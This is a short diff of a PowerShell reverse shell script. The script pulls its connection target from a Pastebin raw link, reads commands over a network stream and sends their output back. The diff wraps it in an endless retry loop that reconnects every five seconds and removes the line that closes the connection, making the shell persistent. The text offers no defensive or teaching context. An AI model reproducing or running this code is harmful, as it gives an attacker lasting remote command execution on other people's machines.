@@ -1,3 +1,5 @@
+While($true) {
+    Try { 
 $pastebinLink = 'https://pastebin.com/raw/b9j9rc8N'
 
 # Retrieve content from Pastebin
@@ -19,7 +21,9 @@ while ((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -n
     Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2))
     $stream.Write($sendbyte, 0, $sendbyte.Length)
     $stream.Flush()
+        }
+    } Catch {
+        Write-Host "Connection failed. Retrying in 5 seconds..."
+        Start-Sleep -Seconds 5
+    }
 }
-
-# Close the connection
-$client.Close()
